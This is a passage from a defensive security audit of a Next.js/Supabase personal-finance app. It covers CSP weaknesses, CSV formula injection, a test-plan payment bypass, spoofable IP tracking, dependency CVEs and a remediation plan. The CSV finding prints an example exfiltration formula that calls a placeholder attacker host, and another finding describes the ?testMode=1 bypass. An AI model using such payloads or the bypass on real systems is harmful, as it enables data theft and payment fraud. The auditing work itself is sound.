  3. **Server Session Not Revoked on Logout**: Both `SignOutButton.tsx:11` and `app/profile/page.tsx:421` pass `{ scope: 'local' }` to `supabase.auth.signOut({ scope: 'local' })`, which deletes the token from local cookies/storage **without** calling Supabase GoTrue to revoke the refresh token server-side. Any previously captured access/refresh token remains valid on the server even after the user clicks "Sign Out".
- **Recommended Fix**:
  1. In `public/sw.js`, never cache `/api/*` responses or authenticated HTML routes in `CacheStorage`; restrict Service Worker caching to static immutable assets (`/_next/static/*`, `/icons/*`, `/images/*`, fonts) and the public landing page (`/`).
  2. On sign-out (`AuthListener.tsx` `SIGNED_OUT` handler, `SignOutButton.tsx`, and `app/profile/page.tsx`), revoke the session globally (`await supabase.auth.signOut()`), delete Service Worker caches (`await caches.keys().then(keys => Promise.all(keys.map(k => caches.delete(k))))`), and call `posthog.reset()`.

---

## 6. Medium Severity Findings

### [MED-01] Overly Permissive Content Security Policy (`'unsafe-inline'`, `'unsafe-eval'`, Wildcard Subdomains, Unused Third-Party AI APIs)

- **Severity**: **Medium** (CWE-693)
- **File Paths & Line Numbers**:
  - `next.config.ts:93-108`
- **Evidence**:
  ```ts
  // next.config.ts:93-108
  value: [
    "default-src 'self'",
    "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://*.supabase.co https://*.sadabmunshi.me https://challenges.cloudflare.com https://us-assets.i.posthog.com",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com",
    "img-src 'self' data: blob: https://*.supabase.co https://*.googleusercontent.com",
    "connect-src 'self' https://*.supabase.co wss://*.supabase.co https://*.sadabmunshi.me https://api.groq.com https://api.sarvam.ai https://generativelanguage.googleapis.com https://api.brevo.com https://api.ipify.org https://us.i.posthog.com https://us-assets.i.posthog.com https://challenges.cloudflare.com",
    "frame-src 'self' https://*.sadabmunshi.me https://challenges.cloudflare.com",
    "worker-src 'self' blob:",
  ].join('; '),
  ```
- **Impact & Exploitation Prerequisites**:
  - Including `'unsafe-inline'` and `'unsafe-eval'` in `script-src` disables CSP protection against inline script injection and `eval()`-based XSS sinks in production.
  - Wildcard `https://*.sadabmunshi.me` in `script-src`, `connect-src`, and `frame-src` trusts every current and future subdomain of `sadabmunshi.me`. Instead, only explicit origins (`https://pay.sadabmunshi.me` for `script-src`/`frame-src` and `https://api.sadabmunshi.me` / `https://pay-api.sadabmunshi.me` for `connect-src`) should be permitted.
  - `connect-src` still permits direct browser connections to `https://api.groq.com`, `https://api.sarvam.ai`, `https://generativelanguage.googleapis.com`, and `https://api.brevo.com`, which are backend-only services handled by `finflow-api`.
- **Recommended Fix**:
  - Remove `'unsafe-eval'` in production (`process.env.NODE_ENV === 'production'`), remove `https://*.supabase.co` from `script-src`, replace `https://*.sadabmunshi.me` with explicit hostnames (`https://pay.sadabmunshi.me`, `https://api.sadabmunshi.me`), and remove `api.groq.com`, `api.sarvam.ai`, `generativelanguage.googleapis.com`, and `api.brevo.com` from `connect-src`.

---

### [MED-02] CSV Formula Injection (CWE-1236) in Transaction History & Backup CSV Exporters

- **Severity**: **Medium** (CWE-1236)
- **File Paths & Line Numbers**:
  - `app/history/page.tsx:121-137` (`handleExportCSV`)
  - `app/backup-restore/page.tsx:107-116` (`sanitizeText`)
  - `app/backup-restore/page.tsx:329-338` (`handleExportCsv`)
- **Evidence**:
  ```ts
  // app/history/page.tsx:121-134
  const rows = filtered.map(tx => [
    formatTxDate(tx.date),
    tx.type.charAt(0).toUpperCase() + tx.type.slice(1),
    tx.category,
    tx.note,
    tx.type === 'income' ? tx.amount : -tx.amount,
  ])
  const escape = (v: unknown) => {
    const s = String(v)
    return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
  }
  ```
  ```ts
  // app/backup-restore/page.tsx:329-336
  const rows = transactions.map(t => [
    t.date,
    t.type,
    t.category,
    t.amount,
    `"${(t.note || '').replace(/"/g, '""')}"`,
  ])
  ```
- **Impact & Exploitation Prerequisites**:
  - Transaction `note` strings can originate from untrusted external inputs—such as scanning an untrusted receipt image/PDF invoice via `ScanTab.tsx` (`aiParseReceipt`) or importing a shared CSV/JSON file (`sanitizeText` in `app/backup-restore/page.tsx:107-116` strips `[<>"'`]`, `javascript:`, `vbscript:`, and `data:`, but does **not** strip leading `=`, `+`, `-`, `@`, `\t`, `\r`).
  - When a user exports their transactions to CSV (`FinFlow_Transactions_*.csv` or `finflow-backup-*.csv`) and opens the file in Microsoft Excel, Google Sheets, or LibreOffice Calc, any cell beginning with `=`, `+`, `-`, `@`, `\t`, or `\r` is evaluated as an active formula (allowing external data exfiltration via `=HYPERLINK("https://attacker.com/?leak="&A2:E2)` or local DDE execution).
- **Recommended Fix**:
  Prefix any string field (`note`, `category`) starting with `^[=+\-@\t\r]` with a single quote (`'`) during CSV export (and strip leading formula characters in `sanitizeText` during import):
  ```ts
  function sanitizeCsvCell(val: unknown): string {
    let s = String(val ?? '')
    if (/^[=+\-@\t\r]/.test(s)) {
      s = `'${s}`
    }
    return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
  }
  ```

---

### [MED-03] Unauthenticated Query-Parameter Feature Flag (`?testMode=1`) Exposes `test_1inr` (₹1 Test Pass) in Production

- **Severity**: **Medium** (CWE-840 — Business Logic Bypass)
- **File Paths & Line Numbers**:
  - `app/subscription/page.tsx:291-294`
  - `lib/api-client.ts:449-455`
- **Evidence**:
  ```ts
  // app/subscription/page.tsx:291-294
  const showTestPlan =
    searchParams?.get('testMode') === '1' ||
    process.env.NEXT_PUBLIC_ENABLE_TEST_PASS === 'true' ||
    subscription?.planId === 'test_1inr'
  ```
- **Impact & Exploitation Prerequisites**:
  - Any user can append `?testMode=1` to `https://www.app.sadabmunshi.me/subscription?testMode=1` (or call `POST /api/payments/create-order` with `{"planId": "test_1inr"}`) in production to reveal and purchase the `test_1inr` plan (₹1 for 7 days, granting a `2x` AI quota multiplier across NLP, Voice, Receipt OCR, and Insights) instead of paying ₹199/month for Pro Monthly.
- **Recommended Fix**:
  - Remove `searchParams?.get('testMode') === '1'` from `app/subscription/page.tsx:291` in production builds, and restrict `planId: 'test_1inr'` on `finflow-api` (`/api/payments/create-order`) to allowlisted admin user IDs or non-production environments.

---

### [MED-04] Client-Side IP Lookup (`api.ipify.org`) & Spoofable `X-Forwarded-For` Header in Ban & Login Tracking

- **Severity**: **Medium** (CWE-290 / CWE-807)
- **File Paths & Line Numbers**:
  - `context/UserContext.tsx:108-115`
  - `lib/api-client.ts:276-288`
- **Evidence**:
  ```ts
  // context/UserContext.tsx:108-115
  let ipAddress = 'unknown'
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json')
    const ipData = await ipRes.json()
    ipAddress = ipData.ip
  } catch {}

  trackLogin(authUser.id, authUser.email, ipAddress).catch(e => console.error('[trackLogin] Failed:', e))
  ```
  ```ts
  // lib/api-client.ts:276-280
  export async function checkIpBan(ipAddress: string) {
    return request('/api/check-ip-ban', {
      headers: { 'x-forwarded-for': ipAddress },
    })
  }
  ```
- **Impact & Exploitation Prerequisites**:
  - Relying on the client browser to query `https://api.ipify.org` and self-report its IP address in the POST body (`trackLogin`) or `x-forwarded-for` header (`checkIpBan`) allows any user or ad-blocker/script to report `ipAddress: "unknown"` or spoof an arbitrary IP address (potentially framing another user's IP or evading IP ban correlation).
  - Additionally, calling `https://api.ipify.org` on every page initialization leaks user activity metadata to an external third-party service.
- **Recommended Fix**:
  - Remove the client-side `fetch('https://api.ipify.org?format=json')` call in `context/UserContext.tsx:108-113` and derive the client IP exclusively on `finflow-api` from the trusted reverse-proxy header (`cf-connecting-ip` / `x-real-ip` set by Cloudflare/Vercel/Render).

---

### [MED-05] Dynamic Third-Party Payment SDK Injection Without Subresource Integrity (SRI) or Strict Origin Allowlist

- **Severity**: **Medium** (CWE-829 / CWE-353)
- **File Paths & Line Numbers**:
  - `lib/youpi-checkout.ts:55-120, 192-215`
- **Evidence**:
  ```ts
  // lib/youpi-checkout.ts:87-107
  function loadYoupiSdk(sdkUrl?: string): Promise<boolean> {
    if (typeof window === 'undefined') return Promise.resolve(false)
    if (window.YoupiCheckout) return Promise.resolve(true)
    if (sdkLoadPromise) return sdkLoadPromise

    const targetSrc = `${resolvePortalOrigin(sdkUrl)}/sdk/checkout.js`
    ...
    const script = document.createElement('script')
    script.src = targetSrc
    script.async = true
  ```
  ```ts
  // lib/youpi-checkout.ts:66-76
  try {
    const parsed = new URL(rawUrl, portalOrigin)
    if (
      parsed.hostname === 'localhost' ||
      parsed.hostname === '127.0.0.1' ||
      parsed.hostname === '0.0.0.0'
    ) {
      return `${portalOrigin}${parsed.pathname}${parsed.search}`
    }
    return parsed.toString()
  }
  ```
- **Impact & Exploitation Prerequisites**:
  - `loadYoupiSdk(sdkUrl)` accepts an optional `sdkUrl` parameter and injects `<script src="${resolvePortalOrigin(sdkUrl)}/sdk/checkout.js">` into `document.head` without verifying `sdkUrl` against a strict origin allowlist (`['https://pay.sadabmunshi.me']`) and without Subresource Integrity (`script.integrity`).
  - Similarly, `normalizeCheckoutUrl` (`lib/youpi-checkout.ts:66-76`) accepts `rawUrl` from the order creation response and, if `rawUrl` is a non-localhost URL, returns `parsed.toString()` without enforcing `parsed.origin === portalOrigin` or `parsed.protocol === 'https:'` before loading it into `iframe.src` (`lib/youpi-checkout.ts:212`).
- **Recommended Fix**:
  - Enforce an explicit origin allowlist (`const ALLOWED_PAYMENT_ORIGINS = new Set(['https://pay.sadabmunshi.me'])`) inside both `resolvePortalOrigin()` and `normalizeCheckoutUrl()`, and enforce `parsed.protocol === 'https:'`.

---

### [MED-06] High & Moderate Vulnerabilities in Build & Runtime Transitive Dependencies (`sharp@0.33.5`, `postcss`, `ws`, `uuid`, `fflate`, `@hono/node-server`, `@modelcontextprotocol/sdk`)

- **Severity**: **Medium** (CVSS 5.3 – 8.9 depending on reachability)
- **File Paths & Line Numbers**:
  - `package-lock.json` (see full table in Section 8)
- **Evidence**:
  - `sharp@0.33.5`: `GHSA-rgj7-g3m4-5g8c` & `GHSA-wq5f-xc86-pv6w` (High, CVSS 8.9 — libvips / image processing vulnerabilities). Note: `next.config.ts:13` sets `images: { unoptimized: true }`, which reduces runtime Next.js image optimization exposure, though `sharp` remains installed in `node_modules`.
  - `postcss@8.4.31` / `8.5.6`: `GHSA-6g55-p6wh-862q` & `GHSA-r28c-9q8g-f849` (High, CVSS 7.5 — build-time CSS parsing DoS).
  - `ws@8.19.0`: `GHSA-96hv-2xvq-fx4p` (High, CVSS 7.5 — WebSocket server DoS).
  - `uuid@13.0.0`: `GHSA-w5hq-g745-h8pq` (High, CVSS 7.5).
  - `fflate@0.8.2` (transitive dependency of `jspdf`): `GHSA-26v6-9v8q-f464` (High).
- **Recommended Fix**:
  - Upgrade direct packages and run `npm audit fix` with targeted `overrides` in `package.json`.

---

## 7. Low & Informational Findings

### [LOW-01] Build-Time Type-Safety & Security Lint Suppression (`next.config.ts:7-12`)

- **Severity**: **Low** (CWE-1127 / Trail of Bits `insecure-defaults`)
- **File Paths & Line Numbers**: `next.config.ts:7-12`
- **Evidence**:
  ```ts
  // next.config.ts:7-12
  eslint: {
    ignoreDuringBuilds: true,
  },
  typescript: {
    ignoreBuildErrors: true,
  },
  ```
- **Impact**: Disabling both ESLint and TypeScript compiler verification during `next build` allows type errors, unhandled promises, and security lint rule violations to ship silently to production.
- **Recommended Fix**: Set `eslint.ignoreDuringBuilds: false` and `typescript.ignoreBuildErrors: false`, and enforce `npm run lint && npx tsc --noEmit` in CI.

---

### [LOW-02] Missing `Secure` Attribute on `NEXT_LOCALE` Cookie (`lib/i18n-cookie.ts:13`)

- **Severity**: **Low** (CWE-614)
- **File Paths & Line Numbers**: `lib/i18n-cookie.ts:13`
- **Evidence**:
  ```ts
  // lib/i18n-cookie.ts:13
  document.cookie = `${LOCALE_COOKIE}=${locale}; path=/; max-age=${LOCALE_COOKIE_MAX_AGE}; samesite=lax`
  ```
- **Impact**: When set over HTTPS in production, the cookie lacks the `; Secure` attribute, allowing it to be transmitted over plaintext HTTP if a user ever visits an unencrypted `http://` link before HSTS takes effect.
- **Recommended Fix**: Append `; Secure` whenever `window.location.protocol === 'https:'`:
  ```ts
  const secure = typeof window !== 'undefined' && window.location.protocol === 'https:' ? '; Secure' : ''
  document.cookie = `${LOCALE_COOKIE}=${locale}; path=/; max-age=${LOCALE_COOKIE_MAX_AGE}; SameSite=Lax${secure}`
  ```

---

### [LOW-03] Client-Side Direct Table Updates Without Explicit `.eq('user_id', user.id)` Filter & Implicit `WITH CHECK` in Initial RLS Migration

- **Severity**: **Low** (Defense-in-Depth / CWE-284)
- **File Paths & Line Numbers**:
  - `lib/db.ts:69-90, 118-138`
  - `supabase/migrations/001_create_tables.sql:25-27, 58-60, 88-90, 121-123`
- **Evidence**:
  ```ts
  // lib/db.ts:69-74
  export async function updateTransaction(id: string, updates: Partial<Transaction>): Promise<boolean> {
    const { error } = await supabase
      .from('transactions')
      .update(updates)
      .eq('id', id)
    return !error
  }
  ```
  ```sql
  -- supabase/migrations/001_create_tables.sql:25-27
  CREATE POLICY "Users can update own transactions"
    ON transactions FOR UPDATE
    USING (auth.uid() = user_id);
  ```
- **Impact**: While PostgreSQL automatically applies the `USING (auth.uid() = user_id)` expression as the implicit `WITH CHECK` constraint on `FOR UPDATE` policies when `WITH CHECK` is omitted (preventing cross-user row ownership transfer), `lib/db.ts` passes raw `Partial<Transaction>` / `Partial<Budget>` without stripping `id`/`user_id` or adding `.eq('user_id', user.id)`.
- **Recommended Fix**: Explicitly include `WITH CHECK (auth.uid() = user_id)` in all `FOR UPDATE` RLS policies (as already done in `004_admin_audit_and_presence.sql:57`) and whitelist mutable fields (`amount`, `type`, `category`, `note`, `date`) inside `updateTransaction` and `updateBudget`.

---

### [LOW-04] Unescaped URL Variables in Supabase Email Templates (`{{ .ConfirmationURL }}`) & Legacy Domain Reference

- **Severity**: **Low / Informational** (Semgrep `generic.html-templates.security.var-in-href.var-in-href`)
- **File Paths & Line Numbers**:
  - `supabase/email-templates/confirm-signup.html:24, 52, 71, 89`
  - `supabase/email-templates/invite.html:24, 55, 74, 92`
  - `supabase/email-templates/magic-link.html:24, 52, 62, 80`
  - `supabase/email-templates/reset-password.html:24, 52, 62, 80`
- **Evidence**:
  - Semgrep (`security-reports/semgrep-security-audit.json`) flagged 8 instances of `<a href="{{ .ConfirmationURL }}">`.
  - Additionally, all 4 templates load logos and footer links from `https://app.sadabmunshi.online`, whereas `app/layout.tsx:31` and `next.config.ts` use `https://www.app.sadabmunshi.me`. If `sadabmunshi.online` expires or is registered by a third party, all transactional authentication emails will load images and footer links from an attacker-controlled domain.
- **Recommended Fix**:
  1. Ensure Supabase Dashboard → Authentication → URL Configuration → Redirect URLs strictly allowlists `https://www.app.sadabmunshi.me/auth/callback` and `https://www.app.sadabmunshi.me/auth/complete` (no wildcards).
  2. Update `https://app.sadabmunshi.online` in all 4 templates under `supabase/email-templates/` to `https://www.app.sadabmunshi.me`.

---

### [LOW-05] Historical Placeholder Bearer Token Strings in Documentation (`REPORT_RATE_LIMITING.md`)

- **Severity**: **Informational**
- **File Paths & Line Numbers**:
  - `REPORT_RATE_LIMITING.md:303, 311` (Commit `f4d364ce05a6de3f7d40a761fe165a7e291d9d32`)
- **Evidence**:
  - `Gitleaks` (`security-reports/gitleaks-git.json`) detected 2 matches for rule `curl-auth-header`:
    - Line 303: `-H "Authorization: Bearer [REDACTED_PLACEHOLDER_TOKEN]"`
    - Line 311: `-H "Authorization: Bearer [REDACTED_PLACEHOLDER_TOKEN]"`
  - Manual inspection confirmed both strings are literal documentation placeholders (`YOUR_SUPABASE_JWT_TOKEN`) and not real JWTs or live secrets.

---

## 8. Dependency & Supply-Chain Vulnerability Inventory

Combined results from **OSV-Scanner** (`1.9.1`), **Trivy** (`0.76.0`), and **npm audit** (`10.8.2`) across `package.json` and `package-lock.json` (948 total packages scanned):

| Package | Installed Version | Direct / Transitive | Severity | Advisory / CVE IDs | CVSS | Fixed Version |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **`next`** | `15.1.11` | **Direct** (`package.json:33`) | **Critical / High** | `GHSA-f82v-jwr5-mffw` (`CVE-2025-29927`), `GHSA-p293-qw3h-jr36`, `GHSA-c4j6-fc7j-m34r`, `GHSA-89xv-2m56-2m9x`, `GHSA-m99w-x7hq-7vfj`, `GHSA-h25m-26qc-wcjf` (`CVE-2025-67779`), `GHSA-4342-x723-ch2f`, `GHSA-g77x-44xx-532m`, `GHSA-mwv6-3258-q52c`, `GHSA-5f7q-jpqc-wp7h`, `GHSA-qf6f-8489-67w4`, `GHSA-q4gf-8mx6-v5v3` | **9.1** | `>= 15.2.3` / `>= 15.5.15` |
| **`jspdf`** | `4.2.0` | **Direct** (`package.json:29`) | **Critical / High** | `GHSA-wfv2-pwc8-crg5` (HTML Injection), `GHSA-7x6v-j9x4-qf24` (PDF Object Injection) | **9.6** | Upgrade `jspdf` & sanitize inputs |
| **`protobufjs`** | `7.5.4` | Transitive | **Critical** | `GHSA-xq3m-2v4x-88gg` (`CVE-2026-33928`) | **9.8** | `>= 7.5.5` |
| **`proxy-addr`** | `2.0.7` | Transitive | **Critical** | `GHSA-jqcg-44mw-7w3h` | **9.1** | `>= 2.0.8` |
| **`sharp`** | `0.33.5` | Transitive (`next`) | **High** | `GHSA-rgj7-g3m4-5g8c`, `GHSA-wq5f-xc86-pv6w` | **8.9** | `>= 0.33.6` / `0.34.x` |
| **`postcss`** | `8.4.31` / `8.5.6` | **Direct** (`package.json:55`) | **High** | `GHSA-6g55-p6wh-862q`, `GHSA-r28c-9q8g-f849` | **7.5** | `>= 8.5.7` |
| **`ws`** | `8.19.0` | Transitive (`@supabase/realtime-js`) | **High** | `GHSA-96hv-2xvq-fx4p` | **7.5** | `>= 8.19.1` |
| **`uuid`** | `13.0.0` | Transitive | **High / Mod** | `GHSA-w5hq-g745-h8pq` | **7.5** | `>= 13.0.1` |
| **`fflate`** | `0.8.2` | Transitive (`jspdf`) | **High** | `GHSA-26v6-9v8q-f464` | **7.5** | `>= 0.8.3` |
| **`@modelcontextprotocol/sdk`** | `1.25.3` | Transitive | **High** | `GHSA-345p-7cg4-v4c7` | **7.5** | `>= 1.25.4` |
| **`dompurify`** | `3.3.1` | Transitive (`jspdf`) | **Moderate** | 18 mXSS / XSS advisories (`GHSA-v2wj-7wpq-c8vv`, `GHSA-gx9m-whjm-85jf`, `GHSA-mmhx-hmjr-r674`, etc.) | **6.9** | `>= 3.3.2` |
| **`@hono/node-server`** | `1.19.9` | Transitive | **Moderate** | `GHSA-92pp-h63x-v22m`, `GHSA-wc8c-qw6v-h7f6` | **6.5** | `>= 1.19.10` |

---

## 9. Secret Scanning & Environment Variable Exposure Analysis

### 9.1 Working Tree & Git History Secret Scan
- **Working Tree (`.env*` files)**: No `.env`, `.env.local`, or `.env.production` files are committed to the repository (`.gitignore` properly excludes `.env*`).
- **Git Commit History (`gitleaks git`)**: Scanned 73MB of Git history across all commits. Only 2 documentation placeholder matches (`Authorization: Bearer [REDACTED]` in `REPORT_RATE_LIMITING.md:303,311`) were found; **0 live API keys, private keys, or database credentials** exist in commit history.
- **Hardcoded Application Credentials (Manual Discovery)**:
  - `components/auth/LoginForm.tsx:92-93`: Hardcoded demo account email (`demo@finflow.com`) and password (`[REDACTED]`) in client code (reported as **HIGH-03**).

### 9.2 Audit of `NEXT_PUBLIC_*` Client-Exposed Environment Variables
All `NEXT_PUBLIC_*` variables referenced across the codebase were audited to ensure no server-only secrets (such as `SUPABASE_SERVICE_ROLE_KEY`, `TURNSTILE_SECRET_KEY`, `YOUPI_API_SECRET`, `GROQ_API_KEY`, `GEMINI_API_KEY`, `SARVAM_API_KEY`, or `VAPID_PRIVATE_KEY`) are leaked to the client bundle:

| Variable Name | Referenced In | Exposure Assessment |
| :--- | :--- | :--- |
| `NEXT_PUBLIC_SUPABASE_URL` | `lib/supabase/{client,server,middleware}.ts` | **Safe (Intended Public)** — Supabase project URL |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | `lib/supabase/{client,server,middleware}.ts` | **Safe (Intended Public)** — Public anonymous key gated by Supabase RLS |
| `NEXT_PUBLIC_API_URL` | `lib/api-client.ts:3`, `lib/analytics-api.ts:9` | **Safe (Intended Public)** — Backend API base URL |
| `NEXT_PUBLIC_YOUPI_CHECKOUT_URL` | `lib/youpi-checkout.ts:56` | **Safe (Intended Public)** — Public payment portal origin (`https://pay.sadabmunshi.me`) |
| `NEXT_PUBLIC_TURNSTILE_SITE_KEY` | `components/auth/TurnstileWidget.tsx:19` | **Safe (Intended Public)** — Public Cloudflare Turnstile site key |
| `NEXT_PUBLIC_POSTHOG_KEY` / `HOST` | `lib/posthog.ts:4,7` | **Safe (Intended Public)** — Public PostHog project write key |
| `NEXT_PUBLIC_VAPID_PUBLIC_KEY` | `lib/push.ts:32` | **Safe (Intended Public)** — Web Push public VAPID key |
| `NEXT_PUBLIC_ENABLE_TEST_PASS` | `app/subscription/page.tsx:292` | **Safe (Boolean Flag)** — Though overridden by `?testMode=1` query param (see **MED-03**) |

---

## 10. Scan Coverage, Limitations & Tool Execution Log

### 10.1 Coverage Summary
- **Files Scanned**:
  - All Next.js App Router pages, layouts, and route handlers under `app/` (`app/layout.tsx`, `app/page.tsx`, `app/auth/**`, `app/(auth)/**`, `app/dashboard/**`, `app/add/**`, `app/history/**`, `app/budgets/**`, `app/insights/**`, `app/analytics/**`, `app/reports/**`, `app/subscription/**`, `app/profile/**`, `app/settings/**`, `app/privacy-security/**`, `app/backup-restore/**`, `app/transaction/**`, `app/notifications/**`).
  - All shared UI and feature components under `components/` (`components/auth/**`, `components/subscription/**`, `components/notifications/**`, `components/analytics/**`, `components/landing/**`, `components/JsonLd.tsx`, `components/PlatformGate.tsx`).
  - All library and state modules under `lib/` and `context/` (`lib/api-client.ts`, `lib/analytics-api.ts`, `lib/db.ts`, `lib/storage.ts`, `lib/youpi-checkout.ts`, `lib/subscription-utils.ts`, `lib/supabase/**`, `lib/i18n-cookie.ts`, `lib/push.ts`, `lib/posthog.ts`, `context/UserContext.tsx`).
  - Service Worker (`public/sw.js`), Next.js / Vercel config (`next.config.ts`, `vercel.json`, `middleware.ts`), Supabase SQL migrations (`supabase/migrations/001` through `013`), and email templates (`supabase/email-templates/*.html`).
- **Artifacts Generated in `/home/user/finflow-frontend/security-reports/`**:
  - `semgrep-auto.json` / `semgrep-auto.txt`
  - `semgrep-security-audit.json` / `semgrep-security-audit.txt`
  - `semgrep-nextjs-js.json` / `semgrep-nextjs-js.txt`
  - `osv-scanner.json` / `osv-scanner.txt`
  - `trivy-fs.json` / `trivy-fs.txt`
  - `gitleaks-git.json` / `gitleaks-git.txt`
  - `gitleaks-dir.json` / `gitleaks-dir.txt`
  - `npm-audit.json` / `npm-audit.txt`
  - `SECURITY_AUDIT.md` (this report)

### 10.2 Limitations & Scope Boundaries
1. **No Live Dynamic / DAST Testing Against Production**: In accordance with strict safety rules, no destructive tests, fuzzing, or live exploit payloads were sent against `https://www.app.sadabmunshi.me`, `https://api.sadabmunshi.me`, or production Supabase instances.
2. **CodeQL CLI**: The `codeql` CLI binary was not pre-installed in the sandbox image; static data-flow coverage was achieved using Semgrep (`1.182.0`) with 9 rulesets (`p/security-audit`, `p/react`, `p/typescript`, `p/owasp-top-ten`, `p/nextjs`, `p/javascript`, `p/nodejs`, `p/secrets`, `p/jwt`) combined with full manual source-to-sink taint tracing.
3. **Live Supabase Dashboard State**: SQL migrations in `supabase/migrations/*.sql` were audited statically; live Supabase dashboard settings (such as Storage bucket policies on `avatars`, GoTrue Redirect URL allowlists, and GoTrue Bot Protection settings) should be verified directly in the Supabase Dashboard.

---

## 11. Prioritized Remediation Roadmap

### Phase 1 — Immediate / Emergency Hotfixes (Within 24–48 Hours)
1. **Upgrade Next.js to Patch `CVE-2025-29927` & SSRF/DoS Advisories (`CRIT-01`)**:
   - Upgrade `next` and `eslint-config-next` to `>= 15.2.4` (or latest `15.x` patched release).
   - Change `lib/supabase/middleware.ts:71-73` so ban-check errors do not silently fail open without backend API enforcement.
2. **Fix Post-Auth Open Redirects (`HIGH-01`)**:
   - Validate `next` in `app/auth/callback/route.ts:7,19` and `app/auth/complete/page.tsx:52-53` using `sanitizeInternalRedirect()` so `next` must start with a single `/` and cannot start with `//`, `/\`, or `@`.
3. **Lock Down Avatar File Upload & Remove `https://*.supabase.co` from `script-src` (`HIGH-02`, `MED-01`)**:
   - Restrict `uploadAvatar` in `app/profile/page.tsx:212-238` to `image/jpeg`, `image/png`, and `image/webp` (`<= 2 MB`), and remove `https://*.supabase.co` from `script-src` in `next.config.ts:95`.

### Phase 2 — High-Priority Security Hardening (Within 1 Week)
4. **Enforce Turnstile Server-Side on Supabase GoTrue & Remove Production Demo Credentials (`HIGH-03`)**:
   - Enable native Turnstile CAPTCHA protection in Supabase Auth settings and pass `options: { captchaToken: token }` into `supabase.auth.signInWithPassword` and `supabase.auth.signUp`.
   - Gate the `handleDemoCredentials` button (`LoginForm.tsx:91-95`) behind a non-production environment flag.
5. **Prevent Authenticated Data Caching in Service Worker & Fix Sign-Out (`HIGH-04`)**:
   - Update `public/sw.js` to stop caching `/api/*` and authenticated HTML pages in `finflow-v1`.
   - Clear `caches.delete('finflow-v1')` and revoke tokens globally (`supabase.auth.signOut()`) upon logout.
6. **Upgrade Vulnerable Dependencies (`CRIT-02`, `CRIT-03`, `MED-06`)**:
   - Upgrade `jspdf` and add `package.json` `overrides` for `dompurify` (`>= 3.3.2`), `protobufjs` (`>= 7.5.5`), `proxy-addr` (`>= 2.0.8`), `ws` (`>= 8.19.1`), and `postcss` (`>= 8.5.7`).

### Phase 3 — Medium & Defense-in-Depth Improvements (Within 2 Weeks)
7. **Neutralize CSV Formula Injection (`MED-02`)**:
   - Escape leading `=`, `+`, `-`, `@`, `\t`, `\r` characters in `app/history/page.tsx:121-137` and `app/backup-restore/page.tsx:329-338`.
8. **Disable `?testMode=1` in Production (`MED-03`) & Remove Client-Side `api.ipify.org` Lookup (`MED-04`)**:
   - Remove `searchParams?.get('testMode') === '1'` in `app/subscription/page.tsx:291` and rely on server-derived client IP in `finflow-api`.
9. **Harden Payment SDK Loader (`MED-05`), Cookie Flags (`LOW-02`), and Build Checks (`LOW-01`)**:
   - Enforce an explicit origin allowlist (`https://pay.sadabmunshi.me`) in `lib/youpi-checkout.ts`, add `; Secure` to `setLocaleCookie` in `lib/i18n-cookie.ts:13`, update `supabase/email-templates/*.html` domain links (`LOW-04`), and re-enable TypeScript and ESLint verification during builds (`next.config.ts:7-12`).
